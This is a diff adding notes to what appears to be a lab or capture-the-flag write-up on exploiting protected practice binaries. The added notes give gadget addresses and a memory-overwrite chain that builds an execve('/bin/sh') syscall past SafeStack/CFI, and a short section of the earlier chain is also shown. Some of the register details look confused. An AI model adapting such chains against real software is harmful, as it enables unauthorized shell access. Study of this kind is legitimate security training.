@@ -30,3 +30,12 @@ So I overwrite memory with
     0x402b80 : rax = 0x3b
     0x402ac0 : rax = "/bin/sh"
     0x402c30 : syscall2 garget (rsi = '/bin/sh', rdi = 0x3b)
+
+exploitme-safestack-cfi :
+In this case, I can only move to instruction which is bigger than 0x402f40
+I check indirect instruction flow and than I overwrite memory with
+    0x402f50 : rax = 0x39
+    0x402f40 * 2 : rax += 1
+    0x402f40 * 2 : rax += 1
+    0x402f48 : rax = "/bin/sh"
+    0x402f58 : syscall
